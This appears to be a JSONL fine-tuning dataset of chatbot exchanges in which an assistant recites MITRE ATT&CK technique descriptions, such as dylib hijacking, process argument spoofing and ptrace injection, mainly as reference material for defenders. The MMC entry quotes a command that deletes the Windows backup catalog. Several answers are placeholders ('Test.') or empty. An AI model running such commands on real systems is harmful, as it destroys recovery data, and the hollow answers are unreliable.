{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dylib Hijacking' and with the Id: T1574.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dylib Hijacking' and with the Id: T1574.004 is described as follows: Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Downgrade System Image' and with the Id: T1601.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Downgrade System Image' and with the Id: T1601.002 is described as follows: Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  . The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Accounts' and with the Id: T1078.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Accounts' and with the Id: T1078.003 is described as follows: Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Defense Evasion' and with the Id: T1211 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Defense Evasion' and with the Id: T1211 is described as follows: Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw). The systems targeted by this attack pattern are: Linux, Windows, macOS, SaaS, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Trusted Developer Utilities Proxy Execution' and with the Id: T1127 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Trusted Developer Utilities Proxy Execution' and with the Id: T1127 is described as follows: Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Shutdown/Reboot' and with the Id: T1529 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Shutdown/Reboot' and with the Id: T1529 is described as follows: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'MMC' and with the Id: T1218.014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'MMC' and with the Id: T1218.014 is described as follows: Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)For example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Argument Spoofing' and with the Id: T1564.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Argument Spoofing' and with the Id: T1564.010 is described as follows: Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Admin Shares' and with the Id: T1077 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Admin Shares' and with the Id: T1077 is described as follows: Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares)The [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials. (Citation: Technet Net Use). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'COR_PROFILER' and with the Id: T1574.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'COR_PROFILER' and with the Id: T1574.012 is described as follows: Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scheduled Task/Job' and with the Id: T1603 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scheduled Task/Job' and with the Id: T1603 is described as follows: Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. On Android and iOS, APIs and libraries exist to facilitate scheduling tasks to execute at a specified date, time, or interval.On Android, the `WorkManager` API allows asynchronous tasks to be scheduled with the system. `WorkManager` was introduced to unify task scheduling on Android, using `JobScheduler`, `GcmNetworkManager`, and `AlarmManager` internally. `WorkManager` offers a lot of flexibility for scheduling, including periodically, one time, or constraint-based (e.g. only when the device is charging).(Citation: Android WorkManager)On iOS, the `NSBackgroundActivityScheduler` API allows asynchronous tasks to be scheduled with the system. The tasks can be scheduled to be repeating or non-repeating, however, the system chooses when the tasks will be executed. The app can choose the interval for repeating tasks, or the delay between scheduling and execution for one-time tasks.(Citation: Apple NSBackgroundActivityScheduler). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Injection' and with the Id: T1540 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Injection' and with the Id: T1540 is described as follows: Adversaries may use code injection attacks to implant arbitrary code into the address space of a running application. Code is then executed or interpreted by that application. Adversaries utilizing this technique may exploit capabilities to load code in at runtime through dynamic libraries.With root access, `ptrace` can be used to target specific applications and load shared libraries into its process memory.(Citation: Shunix Code Injection Mar 2016)(Citation: Fadeev Code Injection Aug 2018) By injecting code, an adversary may be able to gain access to higher permissions held by the targeted application by executing as the targeted application. In addition, the adversary may be able to evade detection or enable persistent access to a system under the guise of the application\u2019s process.(Citation: Google Triada June 2019). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Adversary-in-the-Middle' and with the Id: T1638 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Adversary-in-the-Middle' and with the Id: T1638 is described as follows: Adversaries may attempt to position themselves between two or more networked devices to support follow-on behaviors such as [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1642).   [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1638) can be achieved through several mechanisms. For example, a malicious application may register itself as a VPN client, effectively redirecting device traffic to adversary-owned resources. Registering as a VPN client requires user consent on both Android and iOS; additionally, a special entitlement granted by Apple is needed for iOS devices. Alternatively, a malicious application with escalation privileges may utilize those privileges to gain access to network traffic.    Specific to Android devices, adversary-in-the-disk is a type of AiTM attack where adversaries monitor and manipulate data that is exchanged between applications and external storage.(Citation: mitd_kaspersky)(Citation: mitd_checkpoint)(Citation: mitd_checkpoint_research) To accomplish this, a malicious application firsts requests for access to multimedia files on the device (`READ_EXTERNAL STORAGE` and `WRITE_EXTERNAL_STORAGE`), then the application reads data on the device and/or writes malware to the device. Though the request for access is common, when used maliciously, adversaries may access files and other sensitive data due to abusing the permission. Multiple applications were shown to be vulnerable against this attack; however, scrutiny of permissions and input validations may mitigate this attack.    Outside of a mobile device, adversaries may be able to capture traffic by employing a rogue base station or Wi-Fi access point. These devices will allow adversaries to capture network traffic after it has left the device, while it is flowing to its destination. On a local network, enterprise techniques could be used, such as [ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002) or [DHCP Spoofing](https://attack.mitre.org/techniques/T1557/003).   If applications properly encrypt their network traffic, sensitive data may not be accessible to adversaries, depending on the point of capture. For example, properly implementing Apple\u2019s Application Transport Security (ATS) and Android\u2019s Network Security Configuration (NSC) may prevent sensitive data leaks.(Citation: NSC_Android). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Abuse Elevation Control Mechanism' and with the Id: T1626 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Abuse Elevation Control Mechanism' and with the Id: T1626 is described as follows: Adversaries may circumvent mechanisms designed to control elevated privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can gain on a machine. Authorization has to be granted to specific users in order to perform tasks that are designated as higher risk. An adversary can use several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system. . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Access Software' and with the Id: T1663 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Access Software' and with the Id: T1663 is described as follows: Adversaries may use legitimate remote access software, such as `VNC`, `TeamViewer`, `AirDroid`, `AirMirror`, etc., to establish an interactive command and control channel to target mobile devices.  Remote access applications may be installed and used post-compromise as an alternate communication channel for redundant access or as a way to establish an interactive remote session with the target device. They may also be used as a component of malware to establish a reverse connection to an adversary-controlled system or service. Installation of remote access tools may also include persistence.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious SMS Message' and with the Id: T1454 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious SMS Message' and with the Id: T1454 is described as follows: Test. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Obtain Device Cloud Backups' and with the Id: T1470 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Obtain Device Cloud Backups' and with the Id: T1470 is described as follows: An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use that access to obtain sensitive data stored in device backups. For example, the Elcomsoft Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's iCloud (Citation: Elcomsoft-EPPB). Elcomsoft also describes (Citation: Elcomsoft-WhatsApp) obtaining WhatsApp communication histories from backups stored in iCloud.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Uninstall Malicious Application' and with the Id: T1630.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Uninstall Malicious Application' and with the Id: T1630.001 is described as follows: Adversaries may include functionality in malware that uninstalls the malicious application from the device. This can be achieved by:  * Abusing device owner permissions to perform silent uninstallation using device owner API calls. * Abusing root permissions to delete files from the filesystem. * Abusing the accessibility service. This requires sending an intent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Removal on Host' and with the Id: T1630 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Removal on Host' and with the Id: T1630 is described as follows: Adversaries may delete, alter, or hide generated artifacts on a device, including files, jailbreak status, or the malicious application itself. These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of mobile security solutions by causing notable events or information to go unreported.. The systems targeted by this attack pattern are: iOS, Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Supply Chain Compromise' and with the Id: T1474 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Supply Chain Compromise' and with the Id: T1474 is described as follows: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:* Manipulation of development tools* Manipulation of a development environment* Manipulation of source code repositories (public or private)* Manipulation of source code in open-source dependencies* Manipulation of software update/distribution mechanisms* Compromised/infected system images* Replacement of legitimate software with modified versions* Sales of modified/counterfeit products to legitimate distributors* Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency, specifically with the widespread usage of third-party advertising libraries.(Citation: Grace-Advertisement)(Citation: NowSecure-RemoteCode). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Impersonate SS7 Nodes' and with the Id: T1430.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Impersonate SS7 Nodes' and with the Id: T1430.002 is described as follows: Adversaries may exploit the lack of authentication in signaling system network nodes to track the to track the location of mobile devices by impersonating a node.(Citation: Engel-SS7)(Citation: Engel-SS7-2008)(Citation: 3GPP-Security)(Citation: Positive-SS7)(Citation: CSRIC5-WG10-FinalReport)  By providing the victim\u2019s MSISDN (phone number) and impersonating network internal nodes to query subscriber information from other nodes, adversaries may use data collected from each hop to eventually determine the device\u2019s geographical cell area or nearest cell tower.(Citation: Engel-SS7). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Match Legitimate Name or Location' and with the Id: T1655.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Match Legitimate Name or Location' and with the Id: T1655.001 is described as follows: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by giving artifacts the name and icon of a legitimate, trusted application (i.e., Settings), or using a package name that matches legitimate, trusted applications (i.e., `com.google.android.gm`). Adversaries may also use the same icon of the file or application they are trying to mimic.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Insecure Third-Party Libraries' and with the Id: T1425 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Insecure Third-Party Libraries' and with the Id: T1425 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Protected User Data' and with the Id: T1636 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Protected User Data' and with the Id: T1636 is described as follows: Adversaries may utilize standard operating system APIs to collect data from permission-backed data stores on a device, such as the calendar or contact list. These permissions need to be declared ahead of time. On Android, they must be included in the application\u2019s manifest. On iOS, they must be included in the application\u2019s `Info.plist` file.   In almost all cases, the user is required to grant access to the data store that the application is trying to access. In recent OS versions, vendors have introduced additional privacy controls for users, such as the ability to grant permission to an application only while the application is being actively used by the user.  If the device has been jailbroken or rooted, an adversary may be able to access [Protected User Data](https://attack.mitre.org/techniques/T1636) without the user\u2019s knowledge or approval. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Asymmetric Cryptography' and with the Id: T1521.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Asymmetric Cryptography' and with the Id: T1521.002 is described as follows: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private that should not be distributed. Due to how asymmetric algorithms work, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA, ElGamal, and ECDSA.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1521/002).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Discovery' and with the Id: T1418 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Discovery' and with the Id: T1418 is described as follows: Adversaries may attempt to get a listing of applications that are installed on a device. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1418) during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempts specific actions.  Adversaries may attempt to enumerate applications for a variety of reasons, such as figuring out what security measures are present or to identify the presence of target applications. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Discovery' and with the Id: T1424 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Discovery' and with the Id: T1424 is described as follows: Adversaries may attempt to get information about running processes on a device. Information obtained could be used to gain an understanding of common software/applications running on devices within a network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1424) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Recent Android security enhancements have made it more difficult to obtain a list of running processes. On Android 7 and later, there is no way for an application to obtain the process list without abusing elevated privileges. This is due to the Android kernel utilizing the `hidepid` mount feature. Prior to Android 7, applications could utilize the `ps` command or examine the `/proc` directory on the device.(Citation: Android-SELinuxChanges)  In iOS, applications have previously been able to use the `sysctl` command to obtain a list of running processes. This functionality has been removed in later iOS versions. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Call Log' and with the Id: T1636.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Call Log' and with the Id: T1636.002 is described as follows: Adversaries may utilize standard operating system APIs to gather call log data. On Android, this can be accomplished using the Call Log Content Provider. iOS provides no standard API to access the call log.  If the device has been jailbroken or rooted, an adversary may be able to access the [Call Log](https://attack.mitre.org/techniques/T1636/002) without the user\u2019s knowledge or approval. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Software Discovery' and with the Id: T1418.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Software Discovery' and with the Id: T1418.001 is described as follows: Adversaries may attempt to get a listing of security applications and configurations that are installed on a device. This may include things such as mobile security products. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1418/001) during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'App Delivered via Email Attachment' and with the Id: T1434 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'App Delivered via Email Attachment' and with the Id: T1434 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Ptrace System Calls' and with the Id: T1631.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Ptrace System Calls' and with the Id: T1631.001 is described as follows: Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.  Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (e.g., by using `malloc`) then invoking that memory with `PTRACE_SETREGS` to set the register containing the next instruction to execute. Ptrace system call injection can also be done with `PTRACE_POKETEXT`/`PTRACE_POKEDATA`, which copy data to a specific address in the target process's memory (e.g., the current address of the next instruction).(Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018)  Ptrace system call injection may not be possible when targeting processes with high-privileges, and on some systems those that are non-child processes.(Citation: BH Linux Inject)  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.. The systems targeted by this attack pattern are: Android, iOS ."}]}
